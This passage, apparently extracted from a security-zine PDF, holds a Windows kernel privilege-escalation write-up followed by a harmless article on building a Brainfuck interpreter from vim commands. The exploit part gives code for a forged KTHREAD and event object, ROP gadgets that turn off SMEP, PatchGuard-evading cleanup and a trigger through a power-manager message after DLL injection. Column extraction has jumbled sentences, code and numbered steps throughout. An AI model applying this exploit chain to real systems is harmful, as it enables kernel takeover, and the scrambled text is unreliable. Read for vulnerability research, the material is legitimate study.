Once that’s done, it’s time to call KiSwapCon-
text. Once control returns from this function, the
new thread will actually be running (i.e., it will ba-
sically be returning from whatever had pre-empted
it to begin with), and KiDeliverApc will be called
as needed in order to deliver any Asynchronous Pro-
cedure Calls (APCs) that were pending to this new
thread.
2. An idle processor was chosen, which already
had a thread selected as its NextThread. The
same operations as above happen, but the ex-
isting KTHREAD is now pre-empted and must be
dealt with. The thread will start executing
imminently.
3. A busy processor was chosen, and this thread
is more important. The same operations as in
case #2 happen, with pre-emption again. The
thread will start executing imminently.
4. A busy processor was chosen, but this thread is
not more important. KiAddThreadToReady-
Queue is used instead, and the state will be
set to Ready instead. The thread will execute
at a later time.
8.1.6
Completing the Exit
Internals Secondo Intermezzo
It should now become apparent that, given a cus-
tom KTHREAD structure, we can fool the scheduler
into entering a scenario where that thread is selected
for immediate execution. To make things even sim-
pler, if we can force this thread to execute on the
65KiExitDispatcher is done, and it returns back
to its caller—not KeSetEvent! As we are now on
a new thread, with a new stack, this will actually
probably return to a completely different API, such
as KeWaitForSingleObject.
8.1.8
9. The RSP0 is updated in the current Task State
Segment (TSS), which is indicated by the Tss-
Base field of the KPCR. The value is set to the
InitialStack field of the new KTHREAD.
10. The RspBase in the KPRCB is updated as per
the above as well.
Make It So—the Context Switch
To understand how KiSwapContext is able to change
to a totally different thread’s execution context, let’s
go inside the belly of the beast. The first oper-
ation that we see is the construction of the ex-
ception frame, which is done with the GENERATE_-
EXCEPTION_FRAME assembly macro, which is pub-
lic in kxamd64.inc. This essentially constructs a
KEXCEPTION_FRAME on the stack, storing all the non-
volatile register contents. Then, the SwapContext
function is called.
Inside of SwapContext, a second structure is
built on the stack, known as the KSWITCH_FRAME
structure, it is documented in the ntosp.h header
file (but not in the public symbols). Inside of the
routine, the following key actions are taken on an
x64 processor (similar, but uniquely different actions
are taken on other CPU architectures):
11. The Running field is set to 0 in the old
KTHREAD.
12. The NpxField is checked to see if
FPU/XSAVE state must be restored for the
new thread.
13. The Compatibility Mode TEB Segment in
the GDT (stored in the GdtBase field of
the KPCR) is updated to point to the new
thread’s TEB, stored in the Teb field of the
KTHREAD.
14. The DS, ES, FS segments are loaded with their
canonical values if they were modified.
1. The Running field is set to 1 inside of the new
KTHREAD.
15. The GS value is updated in both MSRs by us-
ing the swapgs instruction and reloading the
GS segment in between.
2. Runtime CPU Cycles start accumulating
based on the KPRCB’s StartCycles and
CycleTime fields.
3. The count of context switches is incremented
in KPRCB’s ContextSwitches field. 16. The KPCR’s NtTib field is updated to point
to the new thread’s TEB, and WRMSR is used
to set MSR_GS_SWAP.
4. The NpxState field is checked to see if
FPU/XSAVE state must be captured for the
old thread. 17. The count of context switches is incremented
in KTHREAD’s ContextSwitches field.
5. The current value of the stack pointer RSP,
is stored in the old thread’s KernelStack
KTHREAD field. 18. The switch frame is popped off the stack, and
control returns to the caller’s RIP address on
the stack.
6. RSP is updated based on the new thread’s
KernelStack value.
Note that in Windows 10, steps 13-16 are only
performed if the new thread is not a system thread,
which is indicated by the SystemThread flag in the
KTHREAD.
Finally, now having returned back in KiSwap-
Context again, the RESTORE_EXCEPTION_FRAME
macro is used to pop off all non-volatile register state
from the stack frame.
7. A new LDT is loaded if the process owning
the new thread is different than the old thread
(i.e., a process switch has occurred).
8. In a similar vein to the above, the process affin-
ity is updated if needed, and a new CR3 value
is loaded, again in the case of a process switch.
668.1.9
With the sequence of steps performed by the con-
text switch now exposed, taking control of a thread
is an easy matter of controlling its KernelStack field
in the KTHREAD. As soon as the RSP value is set to
this location, the eventual ret instruction will get us
wherever we need to go, with full Ring 0 privileges,
as a typical ROP-friendly instruction.
Even more, if we return to KiSwapContext (as-
suming we have an information leak) we have the
RESTORE_EXCEPTION_FRAME macro, which will take
care of everything but RAX, RCX, and RDX for us. We
can of course return anywhere else we’d like and
build our own ROP chain.
8.1.10
which is not available to user-mode. Therefore, by
forcing our thread to run on Group 0 earlier, we can
guarantee that the CPU Index 0 matches Processor
0.
Coda
1 deathThread . A f f i n i t y = a f f i n i t y ;
deathThread . I d e a l P r o c e s s o r = 0 ;
Now we know this thread will run on the same
processor we’re on, but we want to guarantee it will
pre-empt us. In other words, we need to bump up
its priority higher than ours. We could pick any
number higher than the current priority, but we’ll
pick 31 for two reasons. First, it’s practically guar-
anteed to pre-empt anything on this processor, and
second, it’s in the so-called real-time range which
means it’s not subject to priority adjustments and
quantum tracking, which will make the scheduler’s
job easier when getting this thread in a runnable
state (and avoid us having to define more state).
PoC
Let’s look at the code that implements everything
we’ve just seen. First, we need to hard-code our cur-
rent user-mode thread to run only on the first CPU
of Group 0 (always CPU 0). The reason for this will
become obvious shortly:
deathThread . P r i o r i t y = 3 1 ;
a f f i n i t y . Group = 0 ;
2 a f f i n i t y . Mask = 1 ;
SetThreadGroupAffinity (
4
GetCurrentThread ( ) , &a f f i n i t y , NULL) ;
Okay, so if we’re going to claim that our event
object is being waited on by this thread, we bet-
ter make the thread appear as if it’s in a committed
waiting state with one wait block—the one the event
is associated with:
Next, let us create an active wait any wait block,
associated with an arbitrary thread:
d e a t h B l o c k . WaitType = WaitAny ;
2 d e a t h B l o c k . Thread = &deathThread ;
deathBlock . BlockState = WaitBlockActive ;
1 deathThread . S t a t e = Waiting ;
deathThread . W a i t R e g i s t e r . S t a t e =
3
WaitCommitted ;
deathThread . W a i t B l o c k L i s t = &d e a t h B l o c k ;
5 deathThread . WaitBlockCount = 1 ;
Then we create a Synchronization Event, which
is currently tied to this wait block:
Excellent! For the context switch routine to work
correctly, we also need to make it look like this
thread is in the same process as the current thread.
Otherwise, our address space will become invalid,
and all sorts of other crashes will occur. In order
to do this, we need to know the kernel pointer of
the current process, or KPROCESS structure. Thank-
fully, there exists a variety of documented informa-
tion leaks in the kernel that will allow us to obtain
this information. One common technique is to open
a handle to our own process ID and then enumerate
our own handle table until we find a match for the
handle number. The Windows API will then con-
tain the kernel address of the object associated with
this handle (i.e., our very own process!).
1 deathEvent . Header . Type =
EventSynchronizationObject ;
3 InitializeListHead (
&deathEvent . Header . WaitListHead ) ;
5 InsertTailList (
&deathEvent . Header . WaitListHead ,
7
&d e a t h B l o c k . W a i t L i s t E n t r y ) ;
All right! We now have our event and wait block.
It’s tied to the deathThread, so let’s go fill that out.
First, we give this thread the correct hard affinity
(i.e., the one we just set for ourselves) and soft affin-
ity (i.e., the ideal processor). Note that the ideal
processor is expressed as the raw processor index,
67that must be enabled by software, and it relies on
a particular flag in the CR4 to be set. All we need
is the right ROP gadget to turn that flag off. As it
happens, the function to flush the current TLB is
inlined throughout the kernel, which results in the
following assembly sequence when it’s done at the
end of a function:
1 deathThread . ApcState . P r o c e s s = a d d r P r o c e s s ;
Last, but not least, we need to set up the
kernel stack, which should be pointing to a
KSWITCH_FRAME. And we need to confirm that the
stack truly is resident, as per our discoveries above.
The switch frame has a return address, which we are
free to set to any address we’d like to ROP into.
. t e x t : 0 0 0 0 0 0 0 1 4 0 1 B874C mov cr4 , r c x
2 . t e x t : 0 0 0 0 0 0 0 1 4 0 1 B874F r e t n
1 deathThread . K e r n e l S t a c k R e s i d e n t = TRUE;
deathThread . K e r n e l S t a c k =
3
&d e a t h S t a c k . SwitchFrame ;
d e a t h S t a c k . SwitchFrame . Return =
5
exploitGadget ;
Actually, let’s not forget that we also need to
have a valid FPU stack, so that the FPU/XSAVE
restore can work when context switching. One easy
to way to do this is as follows:
Well, now all that we’re missing is a gadget
to load the right value into RCX. This isn’t hard,
and for example, the KeRemoveQueueDpcEx function
(which is exported) has exactly what we need:
. t e x t : 0 0 0 0 0 0 0 1 4 0 0DB5B1 pop r c x
2 . t e x t : 0 0 0 0 0 0 0 1 4 0 0DB5B2 r e t n
With these two simple gadgets, we can control
and fill out the KEXCEPTION_FRAME that’s supposed
to be right on top of the KSWITCH_FRAME as follows:
1 _fxsave ( deathFpuStack ) ;
deathThread . S t a t e S a v e A r e a = deathFpuStack ;
Once all the above operations are done, we have
a fully exploitable event object, which will get us to
“exploitGadget”. But what should that be?
8.2
ACT II. The Right Gadget and
Cleanup
8.2.1
d e a t h S t a c k . SwitchFrame . Return
=
popRcxRopGadget ; // pop r c x . . .
d e a t h S t a c k . ExceptionFrame . P1Home =
4
d e s i r e d C r 4 V a l u e ; // i . e . : , 0 x506F8
d e a t h S t a c k . ExceptionFrame . P2Home =
6
cr4RopGadget ;
// mov cr4 , r c x . . .
d e a t h S t a c k . ExceptionFrame . P3Home =
8
Stage1Payload ;
// User RIP
2
ROPing to User-Mode
User mode
stack
0xFF...34c
0x21480
0xFF..1088
0x10600
payload
Kernel
image
CPU state
pop rcx
ret rcx = 0x21480
mov cr4, rcx
ret cr4 = 0x21480
8.2.2
Consistency and Recovery
Imagine yourself in Stage1Payload now. Your
KPRCB’s CurrentThread field points to a user-
mode KTHREAD inside of your own personal address
space. Your RSP (and your KTHREAD’s RSP and
TSS’s RSP0) are also pointing to some user-mode
buffer that’s only valid inside your address space.
All it takes is a another thread on another processor
scouring the CPU queues (trying to find out who
to pre-empt) and dereferencing the “deathThread”,
before a crash occurs. And let me tell you, that
happens. . . a lot! Our first order of business should
therefore be to allocate some sort of globally visi-
ble kernel memory where we can store the KTHREAD
we’ve built for ourselves. But the mere act of allo-
cating memory will take a relatively long time, and
chances are high we’ll crash early.
rip = 0x10000
CS = 0x10 (ring 0)
User mode image
Once we’ve established control over RIP/RSP, it’s
time to actually extract some use out of this abil-
ity. As we’re not going to be injecting executable
code in the kernel (especially hard on Windows 8.1,
and even harder on Windows 10), the best place to
direct RIP is in user mode. Sadly, modern mitiga-
tions such as SMEP make this impossible, and any
attempt to execute our user-mode code will result in
a nasty crash. Fortunately, SMEP is a CPU feature
68CPU 0
Process A
KTHREAD
1 copy thread
0x7FFE0F00
CPU n
We’ve seen, however, that we have enough of a
KTHREAD to exit the scheduler and even be context-
switched in. Do we have enough to enter the sched-
uler and be context-switched out? The simplest
way to do so is to use the KeDelayExecutionThread
API and pass in an absurdly large timeout value—
guaranteeing our thread will be stuck in a wait state
forever.
Before doing so, however, we should remem-
ber that all dispatching operations happen at
DISPATCH_LEVEL, as we saw earlier. And normally,
the exit from SwapContext would’ve resulted in re-
turning back to some function that had raised the
IRQL, so that it could then lower it. We are not al-
lowed to re-enter the scheduler at this IRQL, so we’ll
first lower it back down to PASSIVE_LEVEL ourselves.
Our final cleanup code thus looks like this:
DPC
3 register
timer
KERNEL
2 Allocate
pool memory
KUSER_SHARED_DATA
KTHREAD
4 erase thread
0xFFFFF78000000F00
So we’ll take a page out of some very early NT
rootkits. Taking advantage of the fact that the
KUSER_SHARED_DATA structure has a fixed, global
address on all Windows machines and is visible in
all processes. It’s got just enough slack space to fit
our KTHREAD structure too! As soon as that’s done,
we want to update the KPRCB’s CurrentThread to
point to this new copy. The code looks something
like this:
1 __writecr8 (PASSIVE_LEVEL) ;
t i m e o u t . QuadPart = 0x800000007FFFFFFF ;
3 pKeDelayExecutionThread ( KernelMode ,
FALSE, &t i m e o u t ) ;
PKTHREAD newThread =
SharedUserData+s i z e o f ( ∗ SharedUserData ) ;
__movsq( newThread , &deathThread ,
4
s i z e o f (KTHREAD) / s i z e o f (ULONG64) ) ;
__writegsqword (
6
FIELD_OFFSET(KPRCB, CurrentThread ) ,
newThread ) ;
2
8.2.3
Enter PatchGuard
Readers of this magazine ought to know that skape
and skywing aren’t idiots—their PatchGuard tech-
nology embedded into the NT kernel will actually
actively scan for changes to KUSER_SHARED_DATA.
Any modification such as our addition of a ran-
dom KTHREAD in its tail will result in the famous
109 BSOD, with a code of “0”, or “Generic Data
Modifcation”.
Thus, we need to clear out our KTHREAD from
there—but that poses a problem since we can’t de-
stroy the KTHREAD before we call KeDelayExecut-
ionThread. One option is to allocate some non-
paged pool memory and copy our KTHREAD structure
in there, then modify the KPRCB CurrentThread
pointer yet again. But this means that we will be
leaking a KTHREAD in memory forever. Can we do
better?
Another possibility is to do the destruction of the
KTHREAD after the KeDelayExecutionThread has
executed. Nobody will ever need to look at, or touch
the structure, since we know it will never wake up
again. But how can we run after the endless delay?
Clearly, we need another activation point—and Win-
dows offers timer-based deferred procedure routines
(DPCs) as a solution. By allocating a nonpaged
Although unlikely, a race condition is still pos-
sible right before the copy completes. One could
avoid this by creating a user-mode process that cre-
ates priority 31 threads on all processors but the
current one, spinning forever, until the exploit com-
pletes. That will remove any occurrences of proces-
sor queue scanning.
At this point, we can now attack the kernel in
any way we want, but once we’re done, what hap-
pens to this thread? We could attempt to terminate
it with PsTerminateSystemThread, but a number of
things are likely to go wrong—namely that we aren’t
a system thread (but we could fix that by setting
the right KTHREAD flag). Even beyond that, how-
ever, the API would attempt to access a number of
additional KTHREAD and KPROCESS fields, dereference
the thread object as an ETHREAD (which we haven’t
built), and require an amount of information leaks
so great that it is unlikely to ever work. Entering
a tight spin loop would fix these problems, but the
CPU would be pegged down forever, and a single-
core machine would simply lock up.
69Unfortunately for us as attackers, this means
that the timer table now contains a pointer to what
is essentially computable as KUSER_SHARED_DATA +
sizeof(KUSER_SHARED_DATA) + FIELD_OFFSET(-
KTHREAD, Timer))... a data structure that we
have completely zeroed out. That list of hash en-
tries will therefore hit a NULL pointer (Windows
lists are circular, not NULL- terminated) and crash.
We must do one more thing in the CleanDpc routine
then—remove this linkage, which we can do easily:
pool buffer containing a KTIMER structure (initial-
ized with KeInitializeTimer) and a KDPC structure
(initialized with KeInitializeDpc), we can then use
KeSetTimer to force the execution of the DPC to,
say, 5 seconds later in time. This is easy to do as
shown below:
PSTAGE_TWO_DATA data ;
2 LARGE_INTEGER t i m e o u t ;
data = p E x A l l o c a t e P o o l ( NonPagedPool ,
4
s i z e o f ( ∗ data ) ) ;
__movsq( data−>Code , CleanDpc ,
6
s i z e o f ( data−>Code ) / s i z e o f (ULONG64) ) ;
p K e I n i t i a l i z e D p c (&data−>Dpc ,
8
data−>Code , NULL) ;
(&data−>Timer ) ;
10 t i m e o u t . QuadPart = −50000000;
pKeSetTimer(&data−>Timer , timeout ,
12
&data−>Dpc ) ;
1 RemoveEntryList (
&newThread−>Timer . T i m e r L i s t E n t r y ) ;
8.2.4
PatchGuard Redux
Remember the part about Patchguard’s developers
not being stupid? Well, they’re certainly not go-
ing to let the corrupt, SMEP-disabled value of CR4
stand! And so it is, that after a few minutes (or
less), another 109 BSOD is likely to appear, this
time with code 15 (“Critical processor register modi-
fied”). Hence, this is one more thing that we’re going
to have to clean up, and yet again something that
we cannot do as part of our user-mode pre-KeDel-
ayExecutionThread call, because the very next in-
struction would then issue a SMEP violation. Good
thing we’ve got our 5-second timer-based DPC!
Except that things are never that easy, as readers
probably know. One of the great (or terrible) things
about DPCs is that they run in arbitrary thread con-
text and don’t have a particular affinity to a given
processor either, unless told otherwise. While in a
normal interrupt service routine environment, the
DPC will typically execute on the same processor it
was queued on, this is not the case with timer-based
DPCs. In fact, on most systems, these will execute
on CPU 0 at all times, whereas on others, they can
be distributed across processors based on utilization
and power needs. Why is this a problem? Because
we’ve disabled SMEP on one particular processor—
the one that ran our first-stage user-mode payload,
while the DPC can run on a completely different
processor.
As always, the NT kernel offers up an API as
a solution. By using KeSetTargetProcessorDpcEx,
we can make sure the DPC runs on the same pro-
cessor as our first stage payload (which should be
CPU 0, Group 0, but let’s do this in a more portable
way):
Inside of the CleanDpc routine, we simply de-
stroy the thread and free the data:
PKTHREAD newThread =
SharedUserData+s i z e o f ( ∗ SharedUserData ) ;
data = CONTAINING_RECORD(
4
Dpc , STAGE_TWO_DATA, Dpc ) ;
__stosq ( newThread , 0 ,
6
s i z e o f (KTHREAD) / s i z e o f (ULONG64) ) ;
pExFreePool ( data ) ;
2
With the KUSER_SHARED_DATA structure cleaned
up, we should never hear from PatchGuard again.
And so, the system is now restored back to sanity—
except for the case when a few seconds later, some
thread, on some arbitrary processor, inserts a new
timer in the tree of timers. The scheduler, after
computing a 256-based hash bucket handle for the
KTIMER entry, inserts it into the list of existing
KTIMER structures that share the same hash—that,
with a probability of 1/256, is the near-infinitely ex-
piring timer that KeDelayExecutionThread is us-
ing. Why is this a problem, you ask?
Well, as it happens, the kernel doesn’t want to
have to create a timer object whenever a wait is
done that involves a timeout. And so, any time
that a synchronization object is waited upon for a
fixed period of time, or any time that a Sleep/Ke-
DelayExecutionThread call is performed, an inter-
nal KTIMER structure that is preallocated in the
KTHREAD structure is used, under the field name
Timer. This also creates one of the NT kernel’s
best-designed features: the ability to wait on ob-
jects without requiring a single memory allocation.
70Power Manager, exports a handy UmpoAlpcSend-
PowerMessage function. By simply injecting a DLL
into the service, which contains all of the above code
implementation, we can execute the following se-
quence to trigger a Ring 3 to Ring 0 jump:
PROCESSOR_NUMBER procNumber ;
2 pKeGetCurrentProcessorNumberEx (
&procNumber ) ;
4 pKeSetTargetProcessorDpcEx (
&data−>Dpc , &procNumber ) ;
powerMessage . Type =
PowerMessageNotifyLegacyEvent ;
powerMessage . N o t i f y L e g a c y E v e n t . Event =
4
&deathEvent ;
UmpoAlpcSendPowerMessage (
6
&powerMessage , s i z e o f ( powerMessage ) ) ;
2
Success is now finally ours! By cleaning up
the KUSER_SHARED_DATA structure, eliminating the
KTHREAD’s timer from the timer list, and restoring
CR4 back to its original value, the system is now
fully restored in its original state, and we’ve even
freed the KDPC and KTIMER structures. There’s now
not a single trace of the thread left around, which
pretty much amounts to the initial idea of terminat-
ing the thread. From dust we made it, and to dust
it returned.
Of course, our payload hasn’t actually done any-
thing, other than clean up after itself. Obviously,
at this point, any number of actually real system
threads could be created, periodic timer DPCs could
be queued, work items can be queued, and all other
arbitrary kernel-mode operations are permitted, de-
pending on the ultimate goals of our exploit.
8.3
8.3.1
8.4
Conclusion
As we’ve seen in this analysis, sometimes even the
most apparently non-exploitable data corruption/-
type confusion bugs can sometimes be busted open
with sufficient understanding of the underlying op-
erating system and rules around the particular data.
The author is aware of another vulnerability that re-
sults in control of a lock object—which, when fixed,
was assumed to be nothing more than a DoS. The
author posits that such a lock object could’ve also
been maliciously constructed to appear in an non-
acquired state, which would then cause the kernel to
make the thread acquire the lock—meanwhile, with
a race condition, the lock could’ve been made to ap-
pear contended, such as to cause the release path to
signal the contention even, and ultimately lead to
the same exploitation path as discussed here.
It is also important to note that such data cor-
ruption vulnerabilities, which can lead to stack piv-
oting and ROP into user mode will bypass technolo-
gies such as Device Guard, even if configured with
HyperVisor Code Integrity (HVCI)—due to the fact
that all pages executing here will be marked as exe-
cutable. All that is needed is the ability to redirect
execution to the UMPO function, which could be
done if User-Mode UMCI is disabled, or if Power-
Shell is enabled without script protection—one can
reflectively inject and redirect execution of the Sv-
chost.exe process. Note, however, that enabling
HVCI will activate HyperGuard, which protects the
CR4 register and prevents turning off SMEP. This
must be bypassed by a more complex exploit tech-
nique either affecting the PTEs or making the kernel
payload itself be full ROP.
Finally, Windows Redstone 14352 and later fix
this issue, just in time for the publication of the ar-
ticle. This bug will not be back-ported as it does
not meet the bulletin bar, however
ACT III. Denoument
The Trigger
We have so far been operating in an imaginary world
where we can send the kernel an arbitrary Event
Object as a KEVENT and have the kernel attempt to
signal it. We now have shown that this scenario can
reliably lead to kernel execution. The next question
is, how can we trigger it?
As it happens, the kernel has a function called
PopUmpoProcessPowerMessage, which responds to
any message that is sent to the ALPC port that
it creates, called PowerPort. Such messages have
a simple 4-byte header indicating their type, and a
type of 7, which we’ll call PowerMessageNotifyLe-
gacyEvent, and is treated as follows:
1 eventObject =
PowerMessage−>N o t i f y L e g a c y E v e n t . Event ;
3 i f ( eventObject )
KeSetEvent ( e v e n t O b j e c t , 0 , 0 ) ;
To send messages to this port, a complex se-
ries of actions and ALPC-specific setup, plus some-
how getting access to this port, must be performed.
Thankfully, we don’t need to do any of it, as the
UMPO.DLL library, which implements the User Mode
719
A VIM Execution Engine
by Chris Domas
The power of vim is known far and wide, yet it is
only when we push the venerable editor to its limits
that we truly see its beauty. To conclusively demon-
strate vim’s majesty, and silence heretical doubters,
let us construct a copy/paste/search/replace Turing
machine, using vanilla vim commands.
First, we lay some ground rules. Naturally, we
could build a Turing machine using the built-in vim-
script, but it is already known that vimscript is
Turing-complete, and this is hardly sporting. vim
ex commands (the requests we make from vim when
we type a colon) are abundant and powerful, but
these too would make the task simple, and therefore
would fail to illustrate the glory of vim. Instead, we
strive to limit ourselves to normal vim commands -
yank, put, delete, search, and the like.
With these constraints in mind, we must decide
on the design of our machine. For simplicity, let
us implement an interpreter for the widely known
BrainFuck (BF) programming language. Our ma-
chine will be a simple text file that, when opened
in vim and started with a few key presses, inter-
prets BF code through copy/paste/search/replace
style vim commands.
Let us begin by giving our machine some mem-
ory. We create data tape in the text file by simply
adding the following:
Progress! Now we add lines to accommodate in-
put and output, although these will be left empty
for now:
1 _i :
3 _o :
To perform output, our program will need to
convert the numeric memory cells to ASCII values.
This can easily be done by adding an ASCII lookup
table to our program:
1 _a :
. . . __65 A__66 B__67 C__68 D . . . _127 . _uuu
.
The arrangement of underscores and spaces will
assist us in navigating the table with vim com-
mands. Providing an “unknown” uuu allows us to
process values outside the ASCII range.
Now for the fun part—how do we execute our
BF program using just our simple vim commands?
We would envision a small set of commands running
continuously to interpret the program. Of course,
we could manually type out these commands our-
selves, over and over, to perform the execution (and
we indeed encourage this as an enjoyable exercise!),
but in the unfortunate situation in which an inter-
preted program fails to halt, we may come to find
this process laborious. Instead, we will insert the
keys for these commands directly into our vim file.
When complete, we can automatically run the com-
mands on the first line of the file by typing:
_t :
2 0 0 0 0 0 0 0 0 0 0
We now have ten data cells, which we can locate
by searching for _t.
Now what of the BF code itself? Let us add a
Fibonacci number generator to the file:
ggyy@"
If the first line, in turn, moves to other lines,
and repeats this process of yanking a line of com-
mands (yy) and executing the yanked buffer (@"),
execution can continue indefinitely, without any ad-
ditional user action.
_p :
2 >++++++++++ >+ >+[[+++++[ >++++++++
< -] >. <++++++[ > - - - - - - - - < -]+ < < <] >.
4 > >[[ -] <[ >+ < -] > >[ < <+ >+ > -] <[ >+ < -[ >
+ < -[ >+ < -[ >+ < -[ >+ < -[ >+ < -[ >+ < -[ >+ <
6 -[ >+ < -[ >[ -] >+ >+ < < < -[ >+ < -]]]]]]]]
]]]+ > > >] < < <]
72part of the BF branch operations [ and ]. We will
determine the exact commands for each momentar-
ily, which will replace the unknown ??? above. For
now, let us continue the previous process of adding
marks to each for quick navigation.
So to begin, let us simplify the process of navi-
gating the text file by setting marks at key points.
At the start of our text file, we add commands to
set a mark at the beginning of the file:
1
gg0mh
1 /_c^Mnjma ‘ h/_c^Mnf_mf ‘ h/_b^Mnf_mb
A mark at the memory tape:
1
/_t^Mnjmt ‘ h
Now that our marks are set, we add to the top of
our file the commands to execute the first instruc-
tion in the BF program:
A mark at the BF code:
1 ‘ pyl ‘ c /_\V^R"^Mf−ly2tX@ "
1
/_p^Mnjmp ‘ h
This will move to the BF program (‘p), yank one
BF instruction (yl), move to the command table (‘c),
find the BF instruction in the table, (/_\V^R"^M)
move to the list of commands for that instruction
(f-l), yank the list of commands (y2tX)—skipping
an X embedded in the command, and seeking for-
ward to the terminating X—and execute the yanked
commands (@"). With this, our execution begins!
Let’s now complete our table by determining the
commands to execute each BF instruction. > and <
are particularly simple. For >:
A mark at the input, output, and ASCII table:
1
/_o^Mnjmo ‘ h/ _i^Mnjmi ‘ h/_a^Mnjma ‘ h
Although these steps are not strictly necessary,
they will simplify navigating the file for future com-
mands.
Now for execution! BF contains 8 instructions:
increment the current data cell (+), decrement the
current data cell (-), move to the next data cell (>),
move to the previous data cell (<), a conditional
jump forward ([), a conditional jump backward (]),
output the current data cell (.), and input to the
current data cell (,). Let us construct a table of
vim commands to carry out each of these opera-
tions; each label will act as a marker for looking up
the corresponding commands:
1 ‘ twmt ‘ p mpyl ‘ c /_\V^R"^Mf−ly2tX@ "
Plainly, this is: move to the memory tape (‘t),
move forward one memory cell (w), mark the new
location in the tape (mt), move back to the BF pro-
gram (‘p), move forward one character to progress
over the now executed BF instruction ( ), mark the
new location in the BF program (mp), yank the next
BF instruction (yl), and follow the previous process
(‘c/_\V^R"^Mf-ly2tX@") to locate that instruction
in the command table, yank its commands, and ex-
ecute them.
<, then, is similarly implemented as:
1 _c :
_>−???X
3 _<−???X
_[ −???X
5 _] −???X
_+−???X
7 _−−???X
_. −???X
9 _, −???X
_f :_? ? ?X
11 _b :_? ? ?X
1 ‘ tbmt ‘ p mpyl ‘ c /_\V^R"^Mf−ly2tX@ "
We again apply the trick of special charac-
ters around each operation to simplify the search
process—we may find many >’s in our file, but there
will be only one _>-. We mark the end of the com-
mand with an X. We preemptively supply additional
_f and _b commands, to carry out the conditional
What of + and -? + can be performed with:
1 ‘ t ^A‘ p mpyl ‘ c /_\V^R"^Mf−ly2tX@ "
73This is virtually identical to the < and > imple-
mentation. This time, we move to the current data
cell and increment it with ˆ A. Strictly speaking, this
is a violation of the copy/paste/search/replace type
execution we have been using. However, with mini-
mal effort, the increment could be performed via a
lookup table (as we do for the ASCII conversion)—
we simply elide this for brevity.
Simply replacing ˆ A (increment) with ˆ X
(decrement), - is derived:
1 ‘ t y t ‘ f /\(^R" \ | n \ ) x^Mf−ly2tX@ "
Meaning, navigate to the memory tape (‘t), yank
a memory cell (yt ), navigate to the forward as-
sist commands (‘f), search for either the yanked
cell, or, if it is not found, the character n, fol-
lowed by x (/\(^R"\|n\)x^M), and yank and ex-
ecute the given commands, using the process as be-
fore (f-ly2tX@"). This search allows us to achieve
the conditional portion of the [ instruction—we will
include a marker for only “0”, so only a memory cell
of “0” will find a match—all others will be directed to
the “n” character. Our forward assist then appears
as:
1 ‘ t ^X‘ p mpyl ‘ c /_\V^R"^Mf−ly2tX@ "
Now, certainly, our interpreter is not useful with-
out input and output, so let us add . and , com-
mands. . may be
1 ‘ tyw ‘ a /_\(^R" \ | uuu \ ) ^ M e l l y l ‘ op$mo ‘ p mpyl ‘ c /_
\V^R"^Mf−ly2tX@ "
1 _f : _0x: − ‘ p% mpyl ‘ c /_\V^R"^Mf−ly2tX@ "X_nx: − ‘ p
mpyl ‘ c /_\V^R"^Mf−ly2tX@ "X
If the memory cell is 0, the previous search
matches _0x, and the commands following it are
yanked and executed. If the memory cell is not
0, the previous search matches _nx, and the com-
mands following it instead are yanked and exe-
cuted. For 0, we have: go to the BF program
(‘p), navigate to the corresponding ] instruction
(%), move to the instruction after this ( ), mark
the new location in the program (mp), and then
yank and execute the next instruction, as before.
(yl‘c/_\V^R"^Mf-ly2tX@") For non-0, we have: go
to the BF program (‘p), navigate to the next instruc-
tion ( ), mark the new location in the program (mp),
and then yank and execute the next instruction, as
before. (yl‘c/_\V^R"^Mf-ly2tX@")
] is now straightforward. Following the same
patterns, we have:
This of course is: move to the memory tape
(‘t), yank a cell (yw), move to the ASCII table (‘a),
search for the yanked cell or, if it is not found, move
to the uuu marker, (/_\(^R"\|uuu\)^M), move over
the marker characters (ell), yank the corresponding
ASCII character (yl), move to the output (‘o), paste
the ASCII character (p), move to the end of the out-
put ($), mark the new output location (mo), and
finally, move back to the BF program, move over
the executed instruction, grab the next instruction,
locate its commands, and execute them, as before.
1 ( ‘ p mpyl ‘ c /_\V^R"^Mf−ly2tX@ " )
Data input with , is similarly:
1 ‘ iy
mi ‘ a / ^R"_^MT_ye‘ t x t p ‘ p mpyl ‘ c /_\V^R"^
Mf−ly2tX@ "
1 ‘ t y t ‘ b /\(^R" \ | n \ ) x^Mf−ly2tX@ "
for the conditional search, and
Which simply performs the reverse lookup and
stores the result in the current memory cell.
We are close, but, alas!, nothing is ever simple,
and BF’s conditional looping becomes more com-
plicated. The BF [ instruction means precisely “if
the byte at the data pointer is zero, then instead of
moving the instruction pointer forward to the next
command, jump it forward to the command after the
matching ] command.”
1 _b : _0x: − ‘ p mpyl ‘ c /_\V^R"^Mf−ly2tX@ "X_nx: − ‘ p%
mpyl ‘ c /_\V^R"^Mf−ly2tX@ "X
as the backward assist commands. An ardent
observer may argue the the vim % command vi-
olates our copy/paste/search/replace design, and,
alas!, this is so. However, we argue that a series
of searches, increments, and decrements—like those
74:% s /\^A/\="\<C −A>" / g |% s /\^X/\="\<C −X>" / g |% s /\^R/\="\<C −R>" / g |% s /\^M/\ n / g | 0 6
0 f −ly$@ "
### l a u n c h w i t h gg2yy@ " ###
###### @ x o r e a x e a x e a x ######
1
3
5
_c :
_s1−gg0mh ‘ h /_t^Mnjmt ‘ h /_p^Mnjmp ‘ h /_o^Mnjmo ‘ h / _i^Mnjmi ‘ h / _s2^Mnf−ly$@ " njmt_j
_s2 −‘h /_a^Mnjma ‘ h /_c^Mnf : mc ‘ h / _f^Mnf_mf ‘ h /_b^Mnf_mb ‘ p y l ‘ c /_\V^R"^Mf−ly2tX@ "
z_>−‘twmt ‘ p mpyl ‘ c /_\V^R"^Mf−ly2tX@ "Xs_<−‘tbmt ‘ p mpyl ‘ c /_\V^R"^Mf−ly2tX@ "X
_f : _0x : − ‘ p% mpyl ‘ c /_\V^R"^Mf−ly2tX@ "Xa_nx: − ‘ p mpyl ‘ c /_\V^R"^Mf−ly2tX@ "Xmpyl
_b : _0x : − ‘ p mpyl ‘ c /_\V^R"^Mf−ly2tX@ "Xm_nx: − ‘ p% mpyl ‘ c /_\V^R"^Mf−ly2tX@ " X l y 2 t
_+−‘ t ^A‘ p mpyl ‘ c /_\V^R"^Mf−ly2tX@ "Xo_−−‘ t ^X‘ p mpyl ‘ c /_\V^R"^Mf−ly2tX@ "X_/−−
_] − ‘ t y t ‘ b / \ ( ^R" \ | n \ ) x^Mf−ly2tX@ "Xd_[ − ‘ t y t ‘ f / \ ( ^R" \ | n \ ) x^Mf−ly2tX@ "X^$0x :−
